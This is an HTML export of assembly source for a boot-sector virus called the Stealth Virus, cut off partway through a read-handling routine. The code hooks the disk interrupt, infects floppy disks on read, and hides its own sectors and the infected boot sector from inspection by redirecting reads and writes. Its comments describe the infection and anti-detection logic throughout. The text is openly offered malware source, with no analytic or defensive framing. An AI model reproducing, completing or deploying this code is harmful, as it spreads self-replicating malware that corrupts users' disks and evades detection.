<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;The Stealth Virus is a boot sector virus which remains resident in memory</span><span class="sc0">
</span><span class="sc1">;after boot so it can infect disks. It hides itself on the disk and includes</span><span class="sc0">
</span><span class="sc1">;special anti-detection interrupt traps so that it is very difficult to</span><span class="sc0">
</span><span class="sc1">;locate. This is a very infective and crafty virus.</span><span class="sc0">

</span><span class="sc5">COMSEG</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">COMSEG</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">COMSEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">COMSEG</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">COMSEG</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100H</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BOOT_START</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;* BIOS DATA AREA                                                              *</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">413H</span><span class="sc0">

</span><span class="sc5">MEMSIZE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">640</span><span class="sc0">                     </span><span class="sc1">;size of memory installed, in KB</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;* VIRUS CODE STARTS HERE                                                      *</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7000H</span><span class="sc0">

</span><span class="sc5">STEALTH</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;A label for the beginning of the virus</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Format data consists of Track #, Head #, Sector # and Sector size code (2=512b)</span><span class="sc0">
</span><span class="sc1">;for every sector on the track. This is put at the very start of the virus so</span><span class="sc0">
</span><span class="sc1">;that when sectors are formatted, we will not run into a DMA boundary, which</span><span class="sc0">
</span><span class="sc1">;would cause the format to fail. This is a false error, but one that happens</span><span class="sc0">
</span><span class="sc1">;with some BIOS's, so we avoid it by putting this data first.</span><span class="sc0">
</span><span class="sc5">FMT_12M</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Format data for Track 80, Head 1 on a 1.2 Meg diskette,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">FMT_360</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Format data for Track  40, Head 1 on a 360K diskette</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;* INTERRUPT 13H HANDLER                                                       *</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************</span><span class="sc0">

</span><span class="sc5">OLD_13H</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;Old interrupt 13H vector goes here</span><span class="sc0">

</span><span class="sc5">INT_13H</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;we want to intercept reads</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">READ_FUNCTION</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;and writes to all disks</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WRITE_FUNCTION</span><span class="sc0">
</span><span class="sc5">I13R</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This section of code handles all attempts to access the Disk BIOS Function 2,</span><span class="sc0">
</span><span class="sc1">;(Read). It checks for several key situations where it must jump into action.</span><span class="sc0">
</span><span class="sc1">;they are:</span><span class="sc0">
</span><span class="sc1">;       1) If an attempt is made to read the boot sector, it must be processed</span><span class="sc0">
</span><span class="sc1">;          through READ_BOOT, so an infected boot sector is never seen. Instead,</span><span class="sc0">
</span><span class="sc1">;          the original boot sector is read.</span><span class="sc0">
</span><span class="sc1">;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-7 on</span><span class="sc0">
</span><span class="sc1">;          drive C are read, they are processed by READ_HARD, so the virus</span><span class="sc0">
</span><span class="sc1">;          code is never seen on the hard drive.</span><span class="sc0">
</span><span class="sc1">;       3) If an attempt is made to read Track 1, Head 0, Sector 1 on the</span><span class="sc0">
</span><span class="sc1">;          floppy, this routine checks to see if the floppy has already been</span><span class="sc0">
</span><span class="sc1">;          infected, and if not, it goes ahead and infects it.</span><span class="sc0">

</span><span class="sc5">READ_FUNCTION</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;Disk Read Function Handler</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;is it head 0?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;nope, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;is it track 1?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RF0</span><span class="sc0">                             </span><span class="sc1">;yes, go do special processing</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;is it track 0?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;no, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;track 0, is it sector 1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">READ_BOOT</span><span class="sc0">                       </span><span class="sc1">;yes, go handle boot sector read</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;no, is it hard drive c:?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RF1</span><span class="sc0">                             </span><span class="sc1">;yes, go check further</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;else let BIOS handle it</span><span class="sc0">

</span><span class="sc5">RF0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;is it hard disk?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;yes, let BIOS handle read</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;no, floppy, is it sector 1?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;no, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CHECK_DISK</span><span class="sc0">                      </span><span class="sc1">;is floppy already infected?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;yes so let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_FLOPPY</span><span class="sc0">                   </span><span class="sc1">;no, go infect the diskette</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">I13R</span><span class="sc0">                      </span><span class="sc1">;and then let BIOS do the read</span><span class="sc0">

</span><span class="sc5">RF1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                            </span><span class="sc1">;sector &lt; 8?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;nope, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">READ_HARD</span><span class="sc0">                       </span><span class="sc1">;yes, divert read on the C drive</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This section of code handles all attempts to access the Disk BIOS Function 3,</span><span class="sc0">
</span><span class="sc1">;(Write). It checks for two key situations where it must jump into action. They</span><span class="sc0">
</span><span class="sc1">;are:</span><span class="sc0">
</span><span class="sc1">;       1) If an attempt is made to write the boot sector, it must be processed</span><span class="sc0">
</span><span class="sc1">;          through WRITE_BOOT, so an infected boot sector is never overwritten.</span><span class="sc0">
</span><span class="sc1">;          instead, the write is redirected to where the original boot sector is</span><span class="sc0">
</span><span class="sc1">;          hidden.</span><span class="sc0">
</span><span class="sc1">;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-7 on</span><span class="sc0">
</span><span class="sc1">;          drive C are written, they are processed by WRITE_HARD, so the virus</span><span class="sc0">
</span><span class="sc1">;          code is never overwritten.</span><span class="sc0">

</span><span class="sc5">WRITE_FUNCTION</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;BIOS Disk Write Function</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;is it head 0?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;nope, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;is it track 0?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;nope, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;is it sector 1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">WF1</span><span class="sc0">                             </span><span class="sc1">;nope, check for hard drive</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WRITE_BOOT</span><span class="sc0">                      </span><span class="sc1">;yes, go handle boot sector read</span><span class="sc0">
</span><span class="sc5">WF1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;is it the hard drive c: ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;no, another hard drive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                            </span><span class="sc1">;sector &lt; 8?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;nope, let BIOS handle it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WRITE_HARD</span><span class="sc0">                      </span><span class="sc1">;else take care of writing to C:</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This section of code handles reading the boot sector. There are three</span><span class="sc0">
</span><span class="sc1">;possibilities: 1) The disk is not infected, in which case the read should be</span><span class="sc0">
</span><span class="sc1">;passed directly to BIOS, 2) The disk is infected and only one sector is</span><span class="sc0">
</span><span class="sc1">;requested, in which case this routine figures out where the original boot</span><span class="sc0">
</span><span class="sc1">;sector is and reads it, and 3) The disk is infected and more than one sector</span><span class="sc0">
</span><span class="sc1">;is requested, in which case this routine breaks the read up into two calls to</span><span class="sc0">
</span><span class="sc1">;the ROM BIOS, one to fetch the original boot sector, and another to fetch the</span><span class="sc0">
</span><span class="sc1">;additional sectors being read. One of the complexities in this last case is</span><span class="sc0">
</span><span class="sc1">;that the routine must return the registers set up as if only one read had</span><span class="sc0">
</span><span class="sc1">;been performed.</span><span class="sc0">
</span><span class="sc1">;  To determine if the disk is infected, the routine reads the real boot sector</span><span class="sc0">
</span><span class="sc1">;into SCRATCHBUF and calls IS_VBS. If that returns affirmative (z set), then</span><span class="sc0">
</span><span class="sc1">;this routine goes to get the original boot sector, etc., otherwise it calls ROM</span><span class="sc0">
</span><span class="sc1">;BIOS and allows a second read to take place to get the boot sector into the</span><span class="sc0">
</span><span class="sc1">;requested buffer at es:bx.</span><span class="sc0">

</span><span class="sc5">READ_BOOT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                              </span><span class="sc1">;set ds=es=cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                           </span><span class="sc1">;and bp=sp</span><span class="sc0">

</span><span class="sc5">RB001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;read the real boot sector</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">RB01</span><span class="sc0">                            </span><span class="sc1">;ok, go on</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;do it again to make sure</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">RB01</span><span class="sc0">                            </span><span class="sc1">;ok, go on</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RB_GOON</span><span class="sc0">                         </span><span class="sc1">;error, let BIOS return err code</span><span class="sc0">
</span><span class="sc5">RB01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_VBS</span><span class="sc0">                          </span><span class="sc1">;is it the viral boot sector?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RB02</span><span class="sc0">                            </span><span class="sc1">;yes, jump</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RB_GOON</span><span class="sc0">                         </span><span class="sc1">;no, let ROM BIOS read sector</span><span class="sc0">
</span><span class="sc5">RB02</span><span class="sc4">:</span><span class="sc1">;  mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START) </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_DR_FLAG</span><span class="sc0">        </span><span class="sc1">;required instead of ^ for a86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get disk type of disk being</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;read, and make an index of it</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RB1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">RB1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">;to look up location of boot sec</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_SECTOR_LOCATION</span><span class="sc0">  </span><span class="sc1">;ax=@BOOT_SECTOR_LOCATION table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;get track of orig boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get head of orig boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get sector of orig boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get drive from original spec</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;get read buffer offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;and segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;from original specification</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">                         </span><span class="sc1">;prepare to read 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;do BIOS int 13H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;see if original request</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;was for more than one sector</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RB_EXIT</span><span class="sc0">                         </span><span class="sc1">;no, go exit</span><span class="sc0">

</span><span class="sc5">READ_1NEXT</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;more than 1 sec requested, so</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;read the rest as a second call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;to BIOS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;first restore these registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;prepare to call BIOS for</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;balance of read</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;get registers straight for it</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;is it the hard drive?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RB15</span><span class="sc0">                            </span><span class="sc1">;nope, go handle floppy</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">;handle an infected hard drive</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;by faking read on extra sectors</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;and returning a block of 0's</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">;ds=es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;set first byte in buffer = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;ax=number of sectors to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;bytes per sector</span><span class="sc0">
